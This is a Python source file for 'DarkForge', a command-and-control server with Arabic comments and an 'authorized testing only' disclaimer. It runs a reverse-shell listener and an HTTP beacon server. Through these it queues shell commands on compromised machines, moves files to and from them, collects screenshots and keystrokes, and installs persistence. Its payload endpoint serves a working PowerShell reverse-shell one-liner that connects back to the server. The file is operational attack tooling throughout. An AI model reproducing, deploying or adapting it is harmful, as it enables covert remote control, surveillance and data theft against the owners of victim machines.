#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DarkForge - Command & Control Server
سيرفر تحكم كامل للبايلودات عن بعد
للاختبارات المصرح بها فقط - Authorized Penetration Testing Only
"""

import os
import sys
import json
import time
import socket
import threading
import base64
import hashlib
import struct
import socketserver
import http.server
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# إضافة المسار
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


class C2Beacon:
    """يمثل جهازًا مخترقًا"""
    
    def __init__(self, beacon_id: str, ip: str, hostname: str = "unknown",
                 username: str = "unknown", os_info: str = "unknown",
                 arch: str = "x64"):
        self.id = beacon_id
        self.ip = ip
        self.hostname = hostname
        self.username = username
        self.os_info = os_info
        self.arch = arch
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.status = "active"
        self.tasks = []
        self.results = []
        self.pid = None
    
    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "ip": self.ip,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os_info,
            "arch": self.arch,
            "first_seen": self.first_seen.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "status": self.status,
            "tasks_pending": len([t for t in self.tasks if t["status"] == "pending"]),
            "tasks_completed": len([t for t in self.tasks if t["status"] == "completed"])
        }
    
    def __repr__(self):
        return f"[{self.id}] {self.hostname}@{self.ip} - {self.status}"


class C2Server:
    """
    Command & Control Server - خادم التحكم الكامل
    يدعم:
    - Reverse Shell (TCP)
    - HTTP Beaconing
    - Task Management
    - File Upload/Download
    - Screenshot Capture
    - Keylogging
    - Persistence
    - Lateral Movement
    """
    
    def __init__(self, host: str = "0.0.0.0", 
                 shell_port: int = 4444,
                 http_port: int = 8080,
                 https_port: int = 8443,
                 password: str = "DarkForge2024"):
        
        self.host = host
        self.shell_port = shell_port
        self.http_port = http_port
        self.https_port = https_port
        self.password = hashlib.sha256(password.encode()).hexdigest()
        
        self.beacons: Dict[str, C2Beacon] = {}
        self.running = False
        self.current_beacon = None
        
        self.output_dir = "output/c2"
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(f"{self.output_dir}/downloads", exist_ok=True)
        os.makedirs(f"{self.output_dir}/screenshots", exist_ok=True)
        os.makedirs(f"{self.output_dir}/logs", exist_ok=True)
        os.makedirs(f"{self.output_dir}/payloads", exist_ok=True)
    
    # ================================================================
    # تشغيل السيرفر
    # ================================================================
    
    def start(self):
        """تشغيل جميع خدمات السيرفر"""
        print(f"{Colors.CYAN}{Colors.BOLD}")
        print(" ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ ")
        print("██╔════╝╚════██╗    ██╔════╝╚══███╔╝██╔══██╗██║   ██║██╔════╝██╔══██╗")
        print("██║      █████╔╝    ███████╗  ███╔╝ ██████╔╝██║   ██║█████╗  ██████╔╝")
        print("██║     ██╔═══╝     ╚════██║ ███╔╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗")
        print("╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║")
        print(" ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝")
        print(f"{Colors.RESET}")
        print(f"{Colors.CYAN}  Command & Control Server v2.0{Colors.RESET}")
        print(f"{Colors.YELLOW}  للاختبارات المصرح بها فقط{Colors.RESET}")
        print(f"{'='*60}")
        
        self.running = True
        
        # تشغيل الثريدات
        threads = []
        
        # 1. Reverse Shell Listener
        shell_thread = threading.Thread(target=self._start_shell_listener, daemon=True)
        shell_thread.start()
        threads.append(shell_thread)
        print(f"{Colors.GREEN}[✓] Reverse Shell Listener: {self.host}:{self.shell_port}{Colors.RESET}")
        
        # 2. HTTP Server
        http_thread = threading.Thread(target=self._start_http_server, daemon=True)
        http_thread.start()
        threads.append(http_thread)
        print(f"{Colors.GREEN}[✓] HTTP Server: {self.host}:{self.http_port}{Colors.RESET}")
        
        # 3. Beacon Handler
        beacon_thread = threading.Thread(target=self._beacon_handler, daemon=True)
        beacon_thread.start()
        threads.append(beacon_thread)
        
        print(f"{Colors.GREEN}[✓] C2 Server started successfully!{Colors.RESET}")
        print(f"\n{Colors.CYAN}Commands:{Colors.RESET}")
        print(f"  help      - Show available commands")
        print(f"  list      - List connected beacons")
        print(f"  use <id>  - Select a beacon")
        print(f"  shell     - Open interactive shell")
        print(f"  tasks     - List tasks for current beacon")
        print(f"  exit      - Shutdown server")
        
        self._command_loop()
    
    def _command_loop(self):
        """حلقة الأوامر التفاعلية"""
        while self.running:
            try:
                prefix = f"{Colors.GREEN}C2{Colors.RESET}"
                if self.current_beacon:
                    beacon = self.beacons.get(self.current_beacon)
                    if beacon:
                        prefix = f"{Colors.RED}[{beacon.hostname}@{beacon.ip}]{Colors.RESET}"
                
                cmd = input(f"\n{prefix} > ").strip()
                
                if not cmd:
                    continue
                
                if cmd == "exit" or cmd == "quit":
                    self.shutdown()
                    break
                
                elif cmd == "help":
                    self._show_help()
                
                elif cmd == "list":
                    self._list_beacons()
                
                elif cmd.startswith("use "):
                    beacon_id = cmd[4:].strip()
                    self._use_beacon(beacon_id)
                
                elif cmd == "shell":
                    if self.current_beacon:
                        self._interactive_shell()
                    else:
                        print(f"{Colors.YELLOW}[!] Select a beacon first: use <id>{Colors.RESET}")
                
                elif cmd == "tasks":
                    self._list_tasks()
                
                elif cmd == "info":
                    if self.current_beacon:
                        self._beacon_info()
                    else:
                        print(f"{Colors.YELLOW}[!] Select a beacon first{Colors.RESET}")
                
                elif cmd.startswith("task "):
                    self._add_task(cmd[5:].strip())
                
                elif cmd.startswith("upload "):
                    parts = cmd[6:].strip().split()
                    if len(parts) >= 1:
                        self._upload_file(parts[0], parts[1] if len(parts) > 1 else None)
                
                elif cmd.startswith("download "):
                    path = cmd[9:].strip()
                    self._download_file(path)
                
                elif cmd == "screenshot":
                    self._request_screenshot()
                
                elif cmd == "keylog":
                    self._start_keylogger()
                
                elif cmd == "persist":
                    self._install_persistence()
                
                elif cmd == "clear":
                    os.system('clear' if os.name == 'posix' else 'cls')
                
                else:
                    print(f"{Colors.YELLOW}[!] Unknown command. Type 'help' for list.{Colors.RESET}")
            
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Use 'exit' to shutdown{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
    
    def _show_help(self):
        """عرض المساعدة"""
        help_text = f"""
{Colors.CYAN}{Colors.BOLD}C2 Server Commands:{Colors.RESET}

{Colors.GREEN}Beacon Management:{Colors.RESET}
  list              - List all connected beacons
  use <id>          - Select a beacon to interact with
  info               - Show current beacon information

{Colors.GREEN}Shell & Execution:{Colors.RESET}
  shell              - Open interactive shell on beacon
  task <command>     - Run a command on beacon (async)
  upload <local> [remote] - Upload file to beacon
  download <remote>   - Download file from beacon

{Colors.GREEN}Surveillance:{Colors.RESET}
  screenshot         - Capture screenshot of beacon
  keylog             - Start/stop keylogger on beacon

{Colors.GREEN}Persistence:{Colors.RESET}
  persist            - Install persistence on beacon

{Colors.GREEN}Task Management:{Colors.RESET}
  tasks              - List all tasks for current beacon

{Colors.GREEN}Other:{Colors.RESET}
  clear              - Clear screen
  exit/quit          - Shutdown server
        """
        print(help_text)
    
    def _list_beacons(self):
        """عرض قائمة البيكنات المتصلة"""
        if not self.beacons:
            print(f"{Colors.YELLOW}[!] No beacons connected{Colors.RESET}")
            return
        
        print(f"\n{Colors.CYAN}{'ID':<12} {'Hostname':<20} {'IP':<18} {'User':<15} {'OS':<20} {'Status':<10} {'Tasks'}{Colors.RESET}")
        print(f"{'─'*100}")
        
        for beacon_id, beacon in self.beacons.items():
            marker = ">" if beacon_id == self.current_beacon else " "
            status_color = Colors.GREEN if beacon.status == "active" else Colors.YELLOW
            print(f"{marker} {beacon_id:<8} {beacon.hostname:<20} {beacon.ip:<18} {beacon.username:<15} {beacon.os_info[:20]:<20} {status_color}{beacon.status:<10}{Colors.RESET} {len([t for t in beacon.tasks if t['status']=='pending']):<5}")
    
    def _use_beacon(self, beacon_id: str):
        """اختيار بكُن معين"""
        if beacon_id in self.beacons:
            self.current_beacon = beacon_id
            beacon = self.beacons[beacon_id]
            print(f"{Colors.GREEN}[✓] Selected beacon: {beacon.hostname}@{beacon.ip}{Colors.RESET}")
        else:
            # استخدام wildcard
            matches = [bid for bid in self.beacons.keys() if bid.startswith(beacon_id)]
            if len(matches) == 1:
                self.current_beacon = matches[0]
                beacon = self.beacons[matches[0]]
                print(f"{Colors.GREEN}[✓] Selected beacon: {beacon.hostname}@{beacon.ip}{Colors.RESET}")
            elif len(matches) > 1:
                print(f"{Colors.YELLOW}[!] Multiple beacons match: {', '.join(matches)}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[✗] Beacon not found: {beacon_id}{Colors.RESET}")
    
    def _beacon_info(self):
        """عرض معلومات البكُن الحالي"""
        if not self.current_beacon:
            return
        
        beacon = self.beacons.get(self.current_beacon)
        if not beacon:
            return
        
        info = f"""
{Colors.CYAN}Beacon Information:{Colors.RESET}
  ID:           {beacon.id}
  IP:           {beacon.ip}
  Hostname:     {beacon.hostname}
  Username:     {beacon.username}
  OS:           {beacon.os_info}
  Arch:         {beacon.arch}
  Status:       {beacon.status}
  First Seen:   {beacon.first_seen}
  Last Seen:    {beacon.last_seen}
  Tasks Done:   {len([t for t in beacon.tasks if t['status']=='completed'])}
  Tasks Pending: {len([t for t in beacon.tasks if t['status']=='pending'])}
        """
        print(info)
    
    def _list_tasks(self):
        """عرض المهام للبكُن الحالي"""
        if not self.current_beacon:
            print(f"{Colors.YELLOW}[!] Select a beacon first{Colors.RESET}")
            return
        
        beacon = self.beacons.get(self.current_beacon)
        if not beacon:
            return
        
        if not beacon.tasks:
            print(f"{Colors.YELLOW}[!] No tasks for this beacon{Colors.RESET}")
            return
        
        print(f"\n{Colors.CYAN}{'ID':<6} {'Command':<40} {'Status':<12} {'Result'}{Colors.RESET}")
        print(f"{'─'*80}")
        
        for i, task in enumerate(beacon.tasks):
            status_color = Colors.GREEN if task['status'] == 'completed' else Colors.YELLOW
            result_preview = ""
            if task['status'] == 'completed' and task.get('result'):
                result_preview = task['result'][:50].replace('\n', ' ')
            print(f"{i:<4} {task['command'][:38]:<40} {status_color}{task['status']:<12}{Colors.RESET} {result_preview}")
    
    def _add_task(self, command: str):
        """إضافة مهمة للبكُن"""
        if not self.current_beacon:
            print(f"{Colors.YELLOW}[!] Select a beacon first{Colors.RESET}")
            return
        
        if not command:
            print(f"{Colors.YELLOW}[!] Usage: task <command>{Colors.RESET}")
            return
        
        beacon = self.beacons.get(self.current_beacon)
        task = {
            "id": len(beacon.tasks),
            "command": command,
            "status": "pending",
            "result": None,
            "created": datetime.now().isoformat()
        }
        beacon.tasks.append(task)
        print(f"{Colors.GREEN}[✓] Task added: {command}{Colors.RESET}")
    
    def _upload_file(self, local_path: str, remote_path: str = None):
        """رفع ملف إلى البكُن"""
        if not self.current_beacon:
            print(f"{Colors.YELLOW}[!] Select a beacon first{Colors.RESET}")
            return
        
        if not os.path.exists(local_path):
            print(f"{Colors.RED}[✗] File not found: {local_path}{Colors.RESET}")
            return
        
        if remote_path is None:
            remote_path = f"C:\\\\Users\\\\Public\\\\{os.path.basename(local_path)}"
        
        # قراءة الملف وتشفيره
        with open(local_path, 'rb') as f:
            file_data = f.read()
        
        file_b64 = base64.b64encode(file_data).decode()
        
        # إنشاء مهمة كتابة الملف
        command = f"write_file: {remote_path} : {file_b64}"
        self._add_task(command)
        print(f"{Colors.GREEN}[✓] Upload queued: {local_path} -> {remote_path}{Colors.RESET}")
    
    def _download_file(self, remote_path: str):
        """تحميل ملف من البكُن"""
        if not self.current_beacon:
            print(f"{Colors.YELLOW}[!] Select a beacon first{Colors.RESET}")
            return
        
        command = f"read_file: {remote_path}"
        self._add_task(command)
        print(f"{Colors.GREEN}[✓] Download queued: {remote_path}{Colors.RESET}")
    
    def _request_screenshot(self):
        """طلب تصوير الشاشة"""
        self._add_task("screenshot")
        print(f"{Colors.GREEN}[✓] Screenshot requested{Colors.RESET}")
    
    def _start_keylogger(self):
        """تشغيل مسجل ضربات المفاتيح"""
        self._add_task("keylog_start")
        print(f"{Colors.GREEN}[✓] Keylogger started on beacon{Colors.RESET}")
    
    def _install_persistence(self):
        """تثبيت الثبات"""
        self._add_task("persist")
        print(f"{Colors.GREEN}[✓] Persistence installation requested{Colors.RESET}")
    
    def _interactive_shell(self):
        """شل تفاعلية"""
        if not self.current_beacon:
            return
        
        beacon = self.beacons[self.current_beacon]
        print(f"{Colors.CYAN}[*] Interactive shell on {beacon.hostname}@{beacon.ip}{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Type 'exit' to return to C2 menu{Colors.RESET}")
        print(f"{'─'*50}")
        
        while True:
            try:
                cmd = input(f"{Colors.RED}shell@{beacon.hostname}{Colors.RESET}> ").strip()
                
                if cmd.lower() == 'exit' or cmd.lower() == 'quit':
                    break
                
                if not cmd:
                    continue
                
                self._add_task(f"exec: {cmd}")
                print(f"{Colors.YELLOW}[*] Command sent. Check 'tasks' for results.{Colors.RESET}")
                
            except KeyboardInterrupt:
                break
    
    # ================================================================
    # السيرفرات (Listeners)
    # ================================================================
    
    def _start_shell_listener(self):
        """تشغيل مستمع الـ Reverse Shell"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((self.host, self.shell_port))
            server_socket.listen(10)
            server_socket.settimeout(1.0)
            
            while self.running:
                try:
                    client_socket, addr = server_socket.accept()
                    
                    # معالجة الاتصال في ثريد منفصل
                    handler = threading.Thread(
                        target=self._handle_shell_connection,
                        args=(client_socket, addr),
                        daemon=True
                    )
                    handler.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"{Colors.RED}[!] Shell listener error: {e}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}[✗] Could not start shell listener: {e}{Colors.RESET}")
        finally:
            server_socket.close()
    
    def _handle_shell_connection(self, client_socket: socket.socket, addr: Tuple[str, int]):
        """معالجة اتصال Reverse Shell"""
        print(f"\n{Colors.GREEN}[+] Incoming connection from {addr[0]}:{addr[1]}{Colors.RESET}")
        
        try:
            client_socket.settimeout(10)
            
            # استقبال معلومات البكُن
            beacon_id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
            
            # إنشاء كائن بكُن جديد
            beacon = C2Beacon(
                beacon_id=beacon_id,
                ip=addr[0]
            )
            
            # محاولة استقبال معلومات إضافية
            try:
                data = client_socket.recv(4096).decode('utf-8', errors='replace')
                if data:
                    try:
                        info = json.loads(data)
                        beacon.hostname = info.get('hostname', 'unknown')
                        beacon.username = info.get('username', 'unknown')
                        beacon.os_info = info.get('os', 'unknown')
                        beacon.arch = info.get('arch', 'x64')
                    except:
                        beacon.hostname = data[:50].strip()
            except:
                pass
            
            self.beacons[beacon_id] = beacon
            print(f"{Colors.GREEN}[✓] Beacon registered: {beacon.hostname}@{addr[0]} [{beacon_id}]{Colors.RESET}")
            
            # تحديث وتعيين كحالي
            self.current_beacon = beacon_id
            
            # حفظ الجلسة
            log_path = f"{self.output_dir}/logs/shell_{beacon_id}.log"
            
            # التفاعل مع الشل
            client_socket.settimeout(0.5)
            
            while self.running and beacon.status == "active":
                try:
                    # استقبال بيانات
                    try:
                        data = client_socket.recv(8192)
                        if not data:
                            break
                        
                        decoded = data.decode('utf-8', errors='replace')
                        print(f"{Colors.WHITE}{decoded}{Colors.RESET}", end='')
                        
                        # حفظ في السجل
                        with open(log_path, 'a') as log:
                            log.write(decoded)
                        
                    except socket.timeout:
                        pass
                    
                    # إرسال أوامر
                    cmd = input()
                    if cmd.strip().lower() == 'exit':
                        break
                    
                    client_socket.send((cmd + '\n').encode())
                    time.sleep(0.1)
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    break
            
            beacon.status = "disconnected"
            client_socket.close()
            print(f"\n{Colors.YELLOW}[!] Beacon {beacon_id} disconnected{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error handling connection: {e}{Colors.RESET}")
    
    def _start_http_server(self):
        """تشغيل HTTP Server"""
        
        class C2HTTPHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                try:
                    parsed = urlparse(self.path)
                    path = parsed.path
                    params = parse_qs(parsed.query)
                    
                    if path == '/beacon':
                        # استقبال إشارات البكُن
                        self._handle_beacon(params)
                    
                    elif path == '/task':
                        # استقبال مهام
                        self._handle_task_response(params)
                    
                    elif path == '/download':
                        # تحميل ملف
                        self._handle_download()
                    
                    elif path == '/payload':
                        # تقديم بايلود
                        self._serve_payload()
                    
                    else:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b'Not Found')
                
                except Exception as e:
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(str(e).encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length)
                
                try:
                    data = json.loads(body.decode('utf-8', errors='replace'))
                    
                    if '/beacon' in self.path:
                        self._register_beacon(data)
                    elif '/result' in self.path:
                        self._receive_result(data)
                    else:
                        self.send_response(200)
                        self.end_headers()
                        
                except:
                    self.send_response(400)
                    self.end_headers()
            
            def _register_beacon(self, data: dict):
                """تسجيل بكُن جديد"""
                beacon_id = data.get('id', hashlib.md5(str(time.time()).encode()).hexdigest()[:8])
                
                beacon = C2Beacon(
                    beacon_id=beacon_id,
                    ip=self.client_address[0],
                    hostname=data.get('hostname', 'unknown'),
                    username=data.get('username', 'unknown'),
                    os_info=data.get('os', 'unknown'),
                    arch=data.get('arch', 'x64')
                )
                
                self.server.c2_server.beacons[beacon_id] = beacon
                self.server.c2_server.current_beacon = beacon_id
                
                print(f"\n{Colors.GREEN}[+] Beacon registered via HTTP: {beacon.hostname}@{self.client_address[0]} [{beacon_id}]{Colors.RESET}")
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                
                # إرجاع المهام المعلقة
                pending_tasks = [t for t in beacon.tasks if t['status'] == 'pending']
                self.wfile.write(json.dumps({"tasks": pending_tasks}).encode())
            
            def _handle_beacon(self, params: dict):
                """معالجة إشارة بكُن"""
                beacon_id = params.get('id', [None])[0]
                if beacon_id and beacon_id in self.server.c2_server.beacons:
                    beacon = self.server.c2_server.beacons[beacon_id]
                    beacon.last_seen = datetime.now()
                    
                    # إرجاع المهام المعلقة
                    pending = [t for t in beacon.tasks if t['status'] == 'pending']
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({"tasks": pending}).encode())
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def _handle_task_response(self, params: dict):
                """معالجة نتائج المهام"""
                beacon_id = params.get('id', [None])[0]
                task_id = params.get('task_id', [None])[0]
                result = params.get('result', [''])[0]
                
                if beacon_id and beacon_id in self.server.c2_server.beacons:
                    beacon = self.server.c2_server.beacons[beacon_id]
                    
                    if task_id:
                        task_id = int(task_id)
                        if task_id < len(beacon.tasks):
                            beacon.tasks[task_id]['status'] = 'completed'
                            beacon.tasks[task_id]['result'] = result
                            
                            # عرض النتيجة
                            print(f"\n{Colors.CYAN}[Task {task_id} Result]:{Colors.RESET}")
                            print(f"{Colors.WHITE}{result[:500]}{Colors.RESET}")
                
                self.send_response(200)
                self.end_headers()
            
            def _receive_result(self, data: dict):
                """استقبال نتائج"""
                beacon_id = data.get('beacon_id')
                result_type = data.get('type', 'unknown')
                result_data = data.get('data', '')
                
                if beacon_id and beacon_id in self.server.c2_server.beacons:
                    beacon = self.server.c2_server.beacons[beacon_id]
                    
                    if result_type == 'screenshot':
                        # حفظ الصورة
                        img_data = base64.b64decode(result_data)
                        img_path = f"{self.server.c2_server.output_dir}/screenshots/{beacon_id}_{int(time.time())}.png"
                        with open(img_path, 'wb') as f:
                            f.write(img_data)
                        print(f"\n{Colors.GREEN}[+] Screenshot saved: {img_path}{Colors.RESET}")
                    
                    elif result_type == 'keylog':
                        # حفظ ضربات المفاتيح
                        log_path = f"{self.server.c2_server.output_dir}/logs/keylog_{beacon_id}.txt"
                        with open(log_path, 'a') as f:
                            f.write(f"[{datetime.now()}]\n{result_data}\n")
                        print(f"\n{Colors.GREEN}[+] Keylog data received{Colors.RESET}")
                    
                    elif result_type == 'file':
                        # حفظ الملف
                        file_data = base64.b64decode(result_data.get('data', ''))
                        file_name = result_data.get('name', 'unknown_file')
                        file_path = f"{self.server.c2_server.output_dir}/downloads/{beacon_id}_{file_name}"
                        with open(file_path, 'wb') as f:
                            f.write(file_data)
                        print(f"\n{Colors.GREEN}[+] File downloaded: {file_path}{Colors.RESET}")
                
                self.send_response(200)
                self.end_headers()
            
            def _handle_download(self):
                """تقديم ملف للتحميل"""
                # تقديم بايلود
                payload_path = self.server.c2_server.output_dir + "/payloads/"
                
                # البحث عن أحدث بايلود
                payloads = []
                if os.path.exists(payload_path):
                    payloads = os.listdir(payload_path)
                
                if payloads:
                    latest = max(payloads, key=lambda f: os.path.getmtime(os.path.join(payload_path, f)))
                    with open(os.path.join(payload_path, latest), 'rb') as f:
                        data = f.read()
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/octet-stream')
                    self.send_header('Content-Disposition', f'attachment; filename="{latest}"')
                    self.end_headers()
                    self.wfile.write(data)
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def _serve_payload(self):
                """تقديم البايلود المطلوب"""
                # بايلود افتراضي
                payload_code = f'''$c=New-Object System.Net.Sockets.TCPClient('{self.server.c2_server.host}',{self.server.c2_server.shell_port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()'''
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(payload_code.encode())
            
            def log_message(self, format, *args):
                pass  # إخفاء سجلات HTTP
        
        class C2HTTPServer(http.server.HTTPServer):
            def __init__(self, server_address, c2_server):
                self.c2_server = c2_server
                super().__init__(server_address, C2HTTPHandler)
        
        try:
            server = C2HTTPServer((self.host, self.http_port), self)
            
            while self.running:
                server.handle_request()
                
        except Exception as e:
            if self.running:
                print(f"{Colors.RED}[✗] HTTP Server error: {e}{Colors.RESET}")
    
    def _beacon_handler(self):
        """معالج تحديث حالة البيكنات"""
        while self.running:
            time.sleep(30)
            
            # تحديث حالة البيكنات
            now = datetime.now()
            for beacon_id, beacon in list(self.beacons.items()):
                if (now - beacon.last_seen).seconds > 120:  # 2 دقائق بدون إشارة
                    if beacon.status == "active":
                        beacon.status = "timeout"
                        print(f"{Colors.YELLOW}[!] Beacon timeout: {beacon.hostname}@{beacon.ip}{Colors.RESET}")
    
    # ================================================================
    # الإيقاف
    # ================================================================
    
    def shutdown(self):
        """إيقاف السيرفر"""
        print(f"\n{Colors.YELLOW}[!] Shutting down C2 Server...{Colors.RESET}")
        self.running = False
        
        # حفظ آخر حالة للبيكنات
        state = {
            "time": datetime.now().isoformat(),
            "beacons": {bid: b.to_dict() for bid, b in self.beacons.items()}
        }
        
        with open(f"{self.output_dir}/c2_state.json", 'w') as f:
            json.dump(state, f, indent=4)
        
        print(f"{Colors.GREEN}[✓] C2 State saved{Colors.RESET}")
        print(f"{Colors.GREEN}[✓] Server stopped{Colors.RESET}")
        sys.exit(0)


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='DarkForge - C2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Server host')
    parser.add_argument('--shell-port', type=int, default=4444, help='Reverse shell port')
    parser.add_argument('--http-port', type=int, default=8080, help='HTTP server port')
    parser.add_argument('--password', default='DarkForge2024', help='Server password')
    parser.add_argument('--output', default='output/c2', help='Output directory')
    
    args = parser.parse_args()
    
    server = C2Server(
        host=args.host,
        shell_port=args.shell_port,
        http_port=args.http_port,
        password=args.password
    )
    server.output_dir = args.output
    
    try:
        server.start()
    except KeyboardInterrupt:
        server.shutdown()


if __name__ == '__main__':
    main()
